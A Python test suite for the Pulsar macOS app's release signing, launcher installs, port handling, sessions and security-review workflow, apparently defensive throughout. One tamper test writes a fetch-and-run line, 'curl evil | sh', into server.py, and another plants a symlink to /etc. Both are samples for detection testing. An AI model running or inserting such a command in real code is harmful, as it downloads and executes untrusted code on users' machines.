"""How a release reaches a Mac: the code Pulsar.app carries is installed only as a release signed it (release_sig.py,
launcher.sh), a port held for a moment at start marks no version bad, and a session dies with its server.

Every key here is a throwaway one made for the test; the launcher runs with a home folder of its own and dialogs
written to a file (PULSAR_TEST_DIALOGS), and the code it starts is a stand-in that exits at once.
"""

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from isolation import SCRATCH as _SCRATCH  # noqa: E402,F401  first: nothing real is reachable (isolation.py)

import json  # noqa: E402
import re  # noqa: E402
import shutil  # noqa: E402
import socket  # noqa: E402
import subprocess  # noqa: E402
import tempfile  # noqa: E402
import unittest  # noqa: E402

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, REPO)
from pulsar import config, release_sig, updater  # noqa: E402

OPENSSL = "/usr/bin/openssl"


def make_key(folder, name):
    key, pub = os.path.join(folder, name + ".pem"), os.path.join(folder, name + ".pub.pem")
    subprocess.run([OPENSSL, "ecparam", "-name", "prime256v1", "-genkey", "-noout", "-out", key], check=True, capture_output=True)
    subprocess.run([OPENSSL, "ec", "-in", key, "-pubout", "-out", pub], check=True, capture_output=True)
    with open(pub, encoding="utf-8") as fh:
        return key, fh.read()


def sign(key, data):
    path = os.path.join(tempfile.mkdtemp(), "data")
    with open(path, "wb") as fh:
        fh.write(data)
    return subprocess.run([OPENSSL, "dgst", "-sha256", "-sign", key, path], check=True, capture_output=True).stdout


# A stand-in for pulsar.py: exits at once with FAKE_EXIT (1: "did not start"; 98: "the port was taken").
FAKE_MAIN = "import os, sys\nsys.exit(int(os.environ.get('FAKE_EXIT', '1')))\n"


def write_code(folder, version, extra=None):
    files = {"pulsar.py": FAKE_MAIN, "pulsar/__init__.py": f'__version__ = "{version}"\n',
             "pulsar/server.py": "# the server\n", "web/index.html": "<!doctype html>\n", **(extra or {})}
    for rel, text in files.items():
        path = os.path.join(folder, rel)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(text)


@unittest.skipUnless(os.path.exists(OPENSSL), "needs openssl")
class SigningTest(unittest.TestCase):
    """macos/sign.sh signs as installed copies check, and release.sh's question "would the version people have
    installed accept this signature?" (release_sig signed-for) reads the keys of an earlier version's file."""

    def setUp(self):
        self.dir = tempfile.mkdtemp(dir=_SCRATCH)
        self.addCleanup(shutil.rmtree, self.dir, True)
        self.data = os.path.join(self.dir, "latest.json")
        with open(self.data, "w", encoding="utf-8") as fh:
            fh.write('{"version": "9.9.9"}\n')

    def keys_file(self, *pems):
        path = os.path.join(self.dir, "release_sig_then.py")
        with open(path, "w", encoding="utf-8") as fh:
            fh.write("PUBLIC_KEYS = (\n" + "".join(f'    """{p}""",\n' for p in pems) + ")\n")
        return path

    def signed_for(self, keys, sig):
        return subprocess.run([sys.executable, "-I", "-B", os.path.join(REPO, "pulsar", "release_sig.py"), "signed-for",
                               keys, self.data, sig], capture_output=True).returncode

    def test_a_key_file_signs_through_sign_sh(self):
        key, pub = make_key(self.dir, "main")
        sig = os.path.join(self.dir, "latest.json.sig")
        subprocess.run([os.path.join(REPO, "macos", "sign.sh"), key, self.data, sig], check=True, capture_output=True)
        with open(self.data, "rb") as fh, open(sig, "rb") as sh:
            self.assertTrue(release_sig.verify(fh.read(), sh.read(), pub))

    def test_only_a_key_the_earlier_version_lists_passes(self):
        old, old_pub = make_key(self.dir, "old")
        new, new_pub = make_key(self.dir, "new")
        sig = os.path.join(self.dir, "sig")
        with open(self.data, "rb") as fh:
            data = fh.read()
        with open(sig, "wb") as fh:
            fh.write(sign(new, data))
        self.assertEqual(self.signed_for(self.keys_file(old_pub), sig), 1)  # signed too early with the new key
        self.assertEqual(self.signed_for(self.keys_file(old_pub, new_pub), sig), 0)  # once a release listed it
        with open(sig, "wb") as fh:
            fh.write(sign(old, data))
        self.assertEqual(self.signed_for(self.keys_file(old_pub), sig), 0)  # the move: still the old key
        self.assertEqual(self.signed_for(self.keys_file(), sig), 1)  # a file with no keys accepts nothing

    def test_keys_in_reads_this_version_and_the_old_place(self):
        with open(release_sig.__file__, encoding="utf-8") as fh:
            self.assertEqual(release_sig.keys_in(fh.read()), list(release_sig.PUBLIC_KEYS))
        with open(updater.__file__, encoding="utf-8") as fh:  # before 1.5 the keys were written in updater.py
            text = fh.read()
        self.assertEqual(len(release_sig.keys_in(text)), text.count("-----BEGIN PUBLIC KEY-----"))


@unittest.skipUnless(os.path.exists(OPENSSL), "needs openssl")
class BundleSignatureTest(unittest.TestCase):
    """release_sig.check_bundle: the code is exactly what a release signed, for that version, with a listed key."""

    def setUp(self):
        self.dir = tempfile.mkdtemp()
        self.key, self.pub = make_key(self.dir, "release")
        self.code = os.path.join(self.dir, "app")
        write_code(self.code, "1.1.0")
        self.manifest = release_sig.bundle_manifest(self.code, "1.1.0")
        self.sig = sign(self.key, self.manifest)

    def check(self, version="1.1.0", manifest=None, sig=None, keys=None):
        return release_sig.check_bundle(self.code, self.manifest if manifest is None else manifest,
                                        self.sig if sig is None else sig, version, keys or (self.pub,))

    def test_signed_code_passes_and_finders_litter_is_ignored(self):
        self.assertEqual(self.check(), "")
        with open(os.path.join(self.code, "web", ".DS_Store"), "wb") as fh:
            fh.write(b"\0\0\0\1Bud1")
        self.assertEqual(self.check(), "")
        self.assertEqual(json.loads(self.manifest)["kind"], release_sig.BUNDLE_KIND)

    def test_changed_added_or_missing_files_fail(self):
        with open(os.path.join(self.code, "pulsar", "server.py"), "a", encoding="utf-8") as fh:
            fh.write("import os; os.system('curl evil | sh')\n")
        self.assertIn("pulsar/server.py changed", self.check())
        write_code(self.code, "1.1.0", {"pulsar/sitecustomize.py": "print('hi')\n"})
        self.assertIn("pulsar/sitecustomize.py added", self.check())
        os.remove(os.path.join(self.code, "web", "index.html"))
        self.assertIn("web/index.html missing", self.check())

    def test_unsigned_or_signed_by_another_key_fails(self):
        other, _ = make_key(self.dir, "someone-else")
        self.assertIn("not signed", self.check(sig=b""))
        self.assertIn("not Pulsar's release key", self.check(sig=b"garbage"))
        self.assertIn("not Pulsar's release key", self.check(sig=sign(other, self.manifest)))
        self.assertIn("no description", self.check(manifest=b""))

    def test_a_version_higher_than_any_release_never_passes(self):
        write_code(self.code, "99.0.0")  # the code swapped for a "99.0.0", with 1.1.0's genuine manifest and signature
        self.assertIn("signature is for version 1.1.0, not 99.0.0", self.check("99.0.0"))
        other, _ = make_key(self.dir, "someone-else")
        forged = release_sig.bundle_manifest(self.code, "99.0.0")  # described properly, signed by someone else
        self.assertIn("not Pulsar's release key", self.check("99.0.0", forged, sign(other, forged)))
        self.assertIn("not signed", self.check("99.0.0", forged, b""))

    def test_latest_json_signed_with_the_same_key_is_not_a_manifest(self):
        latest = json.dumps({"version": "1.1.0", "url": "https://x", "sha256": "00", "files": {}}).encode()
        self.assertIn("not a description of an app's code", self.check(manifest=latest, sig=sign(self.key, latest)))

    def test_a_manifest_whose_code_says_another_version_fails(self):
        mixed = release_sig.bundle_manifest(self.code, "1.1.0").replace(b'"version": "1.1.0"', b'"version": "1.2.0"')
        self.assertIn("its code says version 1.1.0, not 1.2.0", self.check("1.2.0", mixed, sign(self.key, mixed)))

    def test_a_symbolic_link_fails(self):
        os.symlink("/etc", os.path.join(self.code, "web", "etc"))
        self.assertIn("symbolic link", self.check())

    def test_the_updater_and_the_launcher_trust_the_same_keys(self):
        self.assertIs(updater.PUBLIC_KEYS, release_sig.PUBLIC_KEYS)
        self.assertIs(updater.verify, release_sig.verify)

    def test_the_command_line_runs_on_its_own(self):
        alone = os.path.join(tempfile.mkdtemp(), "release_sig.py")  # no pulsar/ beside it, as next to the launcher
        shutil.copy(release_sig.__file__, alone)
        manifest, sig = os.path.join(self.dir, "m.json"), os.path.join(self.dir, "m.json.sig")
        with open(manifest, "wb") as fh:
            fh.write(self.manifest)
        with open(sig, "wb") as fh:
            fh.write(self.sig)
        run = subprocess.run(["/usr/bin/python3", "-I", "-B", alone, "check-bundle", self.code, manifest, sig, "1.1.0"],
                             capture_output=True, text=True, timeout=60)
        self.assertEqual(run.returncode, 1)  # the copy trusts the real release keys only, not this test's key
        self.assertIn("not Pulsar's release key", run.stdout)
        run = subprocess.run(["/usr/bin/python3", "-I", "-B", alone, "bundle-manifest", self.code, "1.1.0"],
                             capture_output=True, timeout=60)
        self.assertEqual((run.returncode, run.stdout), (0, self.manifest))


@unittest.skipUnless(os.path.exists(OPENSSL) and os.path.exists("/usr/bin/xcode-select"), "needs a Mac with openssl")
@unittest.skipUnless(os.path.exists(OPENSSL) and os.path.exists("/bin/zsh"), "needs openssl and zsh")
class InstallLineTest(unittest.TestCase):
    """README.md's install line, pasted in zsh: it installs Pulsar.zip only when Pulsar.zip.sig is the release key's
    signature of it, checked with /usr/bin/openssl and the public key written in the line (review 4, B1). Run here
    on local files, with a throwaway key in place of the release key and a folder in place of /Applications."""
    BASE = "https://github.com/fosterinteractive/pulsar/releases/latest/download/"

    def setUp(self):
        with open(os.path.join(REPO, "README.md"), encoding="utf-8") as fh:
            readme = fh.read()
        self.line = next(x.strip() for x in readme.splitlines() if "Pulsar.zip.sig" in x and "openssl" in x)
        self.key_in_line = release_sig.install_line_key(readme)
        self.work = tempfile.mkdtemp(prefix="install-line-")
        for name in ("srv", "apps", "tmp"):
            os.makedirs(os.path.join(self.work, name))
        self.key, pub = make_key(self.work, "throwaway")
        lines = pub.strip().splitlines()
        real = self.key_in_line.strip().splitlines()
        self.test_line = (self.line.replace(self.BASE, "file://" + os.path.join(self.work, "srv") + "/")
                          .replace(real[1], lines[1]).replace(real[2], lines[2])
                          .replace("/Applications", os.path.join(self.work, "apps"))
                          .replace("/usr/bin/open ", "/bin/echo opened "))

    def tearDown(self):
        shutil.rmtree(self.work, ignore_errors=True)

    def serve(self, zip_bytes, sig):
        with open(os.path.join(self.work, "srv", "Pulsar.zip"), "wb") as fh:
            fh.write(zip_bytes)
        sig_path = os.path.join(self.work, "srv", "Pulsar.zip.sig")
        if sig is None:
            if os.path.exists(sig_path):
                os.remove(sig_path)
        else:
            with open(sig_path, "wb") as fh:
                fh.write(sig)

    def paste(self, shell="/bin/zsh"):
        """The line as Terminal's shell runs it: zsh, macOS's default, without the person's own settings (bash too)."""
        env = {"PATH": "/usr/bin:/bin", "HOME": os.path.join(self.work, "tmp"), "TMPDIR": os.path.join(self.work, "tmp")}
        flag = "-f" if shell.endswith("zsh") else "--norc"
        return subprocess.run([shell, flag, "-c", self.test_line], capture_output=True, text=True, timeout=60, env=env)

    def app_zip(self, marker="1"):
        import io
        import zipfile
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            zf.writestr("Pulsar.app/Contents/Info.plist", f"<plist>{marker}</plist>")
        return buf.getvalue()

    def test_the_line_is_one_line_with_full_paths_and_the_release_key(self):
        self.assertIn(self.key_in_line, release_sig.PUBLIC_KEYS)  # release.sh checks the same before it publishes (and that it signed Pulsar.zip)
        self.assertNotIn("\n", self.line)
        for tool in ("mktemp", "curl", "openssl", "ditto", "open", "rm"):
            self.assertRegex(self.line, rf"/(?:usr/)?bin/{tool} ")
        self.assertLess(self.line.index("openssl dgst"), self.line.index("ditto"))  # checked before anything unpacks
        self.assertNotEqual(self.test_line, self.line)

    def test_only_a_zip_the_key_signed_is_installed(self):
        app = os.path.join(self.work, "apps", "Pulsar.app")
        other, _ = make_key(self.work, "someone-else")
        good = self.app_zip()
        for zip_bytes, sig, why in ((good, sign(other, good), "signed with another key"),
                                    (self.app_zip("2"), sign(self.key, good), "a swapped zip"),
                                    (good, None, "no signature"), (good, b"", "an empty signature")):
            self.serve(zip_bytes, sig)
            run = self.paste()  # its status is the clean-up's: what counts is that nothing was installed
            self.assertFalse(os.path.exists(app), why)
            self.assertNotIn("Verified OK", run.stdout, why)
            self.assertNotIn("opened", run.stdout, why)
        self.serve(good, sign(self.key, good))
        for shell in ("/bin/zsh", "/bin/bash"):
            shutil.rmtree(app, ignore_errors=True)
            run = self.paste(shell)
            self.assertIn("Verified OK", run.stdout, (shell, run.stderr))
            self.assertTrue(os.path.isfile(os.path.join(app, "Contents", "Info.plist")), shell)
            self.assertIn("opened", run.stdout)
            self.assertEqual(os.listdir(os.path.join(self.work, "tmp")), [])  # its temporary folder is gone, every time


class LauncherInstallTest(unittest.TestCase):
    """launcher.sh, run as the app runs it: what it installs from the app, and what a port taken at start does."""

    def setUp(self):
        self.dir = tempfile.mkdtemp()
        self.key, self.pub = make_key(self.dir, "release")
        self.home = os.path.join(self.dir, "home")
        self.root = os.path.join(self.home, "Library", "Application Support", "Pulsar")
        self.dialogs = os.path.join(self.dir, "dialogs.txt")
        s = socket.socket()
        s.bind(("127.0.0.1", 0))
        self.port = s.getsockname()[1]  # free, and nothing listens there: the stand-in never does
        s.close()

    def app(self, version, signed_by="release", code_version=None, extra=None):
        """A Pulsar.app whose launcher trusts this test's key (its release_sig.py lists only that key)."""
        res = os.path.join(self.dir, f"Pulsar-{version}-{signed_by}.app", "Contents", "Resources")
        code = os.path.join(res, "app")
        write_code(code, version)
        shutil.copy(os.path.join(REPO, "macos", "launcher.sh"), os.path.join(res, "launcher.sh"))
        with open(release_sig.__file__, encoding="utf-8") as fh:
            source = fh.read()
        keys = "PUBLIC_KEYS = (" + repr(self.pub) + ",)\n"
        source, n = re.subn(r"^PUBLIC_KEYS = \(\n.*?\n\)\n", lambda m: keys, source, count=1, flags=re.S | re.M)
        self.assertEqual(n, 1)
        with open(os.path.join(res, "release_sig.py"), "w", encoding="utf-8") as fh:
            fh.write(source)
        manifest = release_sig.bundle_manifest(code, version)
        with open(os.path.join(res, "app.manifest.json"), "wb") as fh:
            fh.write(manifest)
        if signed_by:
            key = self.key if signed_by == "release" else make_key(self.dir, signed_by)[0]
            with open(os.path.join(res, "app.manifest.json.sig"), "wb") as fh:
                fh.write(sign(key, manifest))
        if code_version or extra:  # changed after it was signed
            write_code(code, code_version or version, extra)
        return os.path.join(res, "launcher.sh")

    def installed(self, version):
        folder = os.path.join(self.root, "versions", version)
        write_code(folder, version)
        os.makedirs(self.root, exist_ok=True)
        if not os.path.lexists(os.path.join(self.root, "current")):
            os.symlink(f"versions/{version}", os.path.join(self.root, "current"))

    def launch(self, launcher, fake_exit=1):
        env = {**os.environ, "HOME": self.home, "XDG_CONFIG_HOME": os.path.join(self.home, ".config"),
               "XDG_CACHE_HOME": os.path.join(self.home, ".cache"), "PULSAR_PORT": str(self.port),
               "PULSAR_NO_BROWSER": "1", "PULSAR_TEST_DIALOGS": self.dialogs, "FAKE_EXIT": str(fake_exit),
               "PULSAR_READ_ONLY": "1"}
        run = subprocess.run(["/bin/bash", launcher], env=env, capture_output=True, text=True, timeout=120)
        try:
            with open(self.dialogs, encoding="utf-8") as fh:
                said = fh.read()
            os.remove(self.dialogs)
        except OSError:
            said = ""
        with open(os.path.join(self.home, "Library", "Logs", "Pulsar.log"), encoding="utf-8") as fh:
            log = fh.read()
        return run.returncode, said, log

    def current(self):
        return os.readlink(os.path.join(self.root, "current")) if os.path.lexists(os.path.join(self.root, "current")) else None

    def test_a_signed_app_installs_its_code(self):
        code, said, log = self.launch(self.app("1.1.0"))
        self.assertIn("Installed Pulsar 1.1.0 from the app", log)
        self.assertEqual(self.current(), "versions/1.1.0")
        self.assertEqual(release_sig.tree(os.path.join(self.root, "versions", "1.1.0")),
                         json.loads(release_sig.bundle_manifest(os.path.join(self.root, "versions", "1.1.0"), "1.1.0"))["files"])
        self.assertIn("could not start", said)  # the stand-in exits at once: that part is not under test here
        self.assertEqual(code, 1)

    def test_unsigned_tampered_or_foreign_code_is_never_installed_on_a_fresh_mac(self):
        for case in ({"signed_by": None}, {"signed_by": "someone-else"}, {"extra": {"pulsar/server.py": "evil\n"}}):
            launcher = self.app("1.1.0", **case)
            code, said, log = self.launch(launcher)
            self.assertEqual(code, 1, case)
            self.assertIn("This copy of Pulsar is not a signed release", said, case)
            self.assertIn("Pulsar did not install it", said)
            self.assertIn("Did not install Pulsar 1.1.0 from the app", log)
            self.assertIsNone(self.current())
            self.assertEqual(os.listdir(os.path.join(self.root, "versions")), [], case)  # no copy, no leftover
            shutil.rmtree(os.path.dirname(os.path.dirname(os.path.dirname(launcher))))

    def test_a_forged_higher_version_leaves_the_installed_one_in_place(self):
        self.installed("1.0.0")
        for case in ({"signed_by": None}, {"signed_by": "someone-else"}):
            code, said, log = self.launch(self.app("99.0.0", **case))
            self.assertIn("not a signed release", said, case)
            self.assertIn("Pulsar 1.0.0, installed before, opens instead", said)
            self.assertIn("Pulsar 1.0.0 starting", log)
            self.assertEqual(self.current(), "versions/1.0.0")
            self.assertFalse(os.path.exists(os.path.join(self.root, "versions", "99.0.0")))
        # 1.1.0's genuine manifest and signature, with the code swapped for a "99.0.0"
        code, said, log = self.launch(self.app("1.1.0", code_version="99.0.0"))
        self.assertIn("the signature is for version 1.1.0, not 99.0.0", said)
        self.assertEqual(self.current(), "versions/1.0.0")
        self.assertFalse(os.path.exists(os.path.join(self.root, "versions", "99.0.0")))

    def test_a_copy_already_in_versions_is_used_only_as_signed(self):
        self.installed("1.0.0")
        write_code(os.path.join(self.root, "versions", "1.1.0"), "1.1.0", {"pulsar/server.py": "left by someone\n"})
        self.launch(self.app("1.1.0"))
        self.assertEqual(self.current(), "versions/1.1.0")
        with open(os.path.join(self.root, "versions", "1.1.0", "pulsar", "server.py"), encoding="utf-8") as fh:
            self.assertEqual(fh.read(), "# the server\n")  # copied again from the app, as signed

    def test_a_port_taken_at_start_is_tried_again_and_marks_nothing_bad(self):
        self.installed("1.0.0")
        launcher = self.app("1.1.0")
        code, said, log = self.launch(launcher, fake_exit=98)  # pulsar.py's PORT_TAKEN, every time
        self.assertEqual(code, 1)
        self.assertIn("another program is using port", said)
        self.assertEqual(log.count("Pulsar 1.1.0 starting"), 5)          # tried five times
        self.assertNotIn("Pulsar 1.0.0 starting", log)                   # previous not tried: the port, not 1.1.0
        self.assertEqual(self.current(), "versions/1.1.0")
        self.assertFalse(os.path.exists(os.path.join(self.root, "bad-versions")))
        code, said, log = self.launch(launcher, fake_exit=1)  # a copy that really does not start: as before
        self.assertIn("Pulsar 1.1.0 did not start; trying 1.0.0", log)
        self.assertFalse(os.path.exists(os.path.join(self.root, "bad-versions")))  # 1.0.0 did not start either


class PortTakenTest(unittest.TestCase):
    def test_pulsar_says_the_port_was_taken_with_its_own_exit_status(self):
        held = socket.socket()
        held.bind(("127.0.0.1", 0))
        held.listen(1)
        self.addCleanup(held.close)
        run = subprocess.run([sys.executable, "-E", "-s", "-B", os.path.join(REPO, "pulsar.py"), "--no-open", "--port",
                              str(held.getsockname()[1])], capture_output=True, text=True, timeout=60)
        self.assertEqual(run.returncode, 98, run.stderr)
        self.assertIn("could not listen", run.stderr)
        with open(os.path.join(REPO, "macos", "launcher.sh"), encoding="utf-8") as fh:
            self.assertIn("PORT_TAKEN=98", fh.read())  # the launcher reads the same number


class SessionLifetimeTest(unittest.TestCase):
    def test_a_session_is_good_only_for_the_server_that_issued_it(self):
        token = config.new_session()
        self.assertTrue(config.valid_session(token))
        self.assertFalse(os.path.exists(config.SESSIONS_FILE))  # kept nowhere a later server would read it
        run = subprocess.run([sys.executable, "-E", "-s", "-B", "-c",
                              "import sys; sys.path.insert(0, sys.argv[1]); from pulsar import config; "
                              "print(config.valid_session(sys.argv[2]))", REPO, token],
                             capture_output=True, text=True, timeout=60)
        self.assertEqual(run.stdout.strip(), "False", run.stderr)  # another server process: no such session
        config.end_session(token)
        self.assertFalse(config.valid_session(token))

    def test_start_up_removes_the_sessions_older_versions_kept(self):
        import importlib.util
        spec = importlib.util.spec_from_file_location("pulsar_main", os.path.join(REPO, "pulsar.py"))
        main = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(main)
        config.ensure_dirs()
        with open(config.SESSIONS_FILE, "w", encoding="utf-8") as fh:
            fh.write(json.dumps({"0" * 64: 1.0}))
        main.tidy()
        self.assertFalse(os.path.exists(config.SESSIONS_FILE))


class SecurityReviewTest(unittest.TestCase):
    """A release waits for the security review (.github/workflows/security.yml) before anything is built or signed, and
    the review can read only: its token, its tools and its actions pinned to a commit."""
    REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

    def read(self, *path):
        with open(os.path.join(self.REPO, *path), encoding="utf-8") as fh:
            return fh.read()

    def test_the_release_stops_on_the_review_before_building(self):
        sh = self.read("macos", "release.sh")
        self.assertLess(sh.index("\n  security_review\n"), sh.index("# --- build"))
        self.assertIn('= success ] ||\n    die "the security review stopped the release', sh)

    def test_the_review_reads_only(self):
        wf = self.read(".github", "workflows", "security.yml")
        self.assertIn("\npermissions:\n  contents: read\n", wf)
        self.assertIn("github_token: ${{ github.token }}", wf)
        self.assertIn("--allowedTools Read,Grep,Glob", wf)
        self.assertRegex(wf, r"--disallowedTools Bash,Write,Edit,[^\n]*WebFetch,WebSearch")
        uses = re.findall(r"uses: (\S+)", wf)
        self.assertTrue(uses and all(re.fullmatch(r"[\w.-]+/[\w.-]+@[0-9a-f]{40}", u) for u in uses), uses)
        # no verdict line is no pass
        self.assertIn('[ "$VERDICT" = pass ] ||', wf)


if __name__ == "__main__":
    unittest.main()
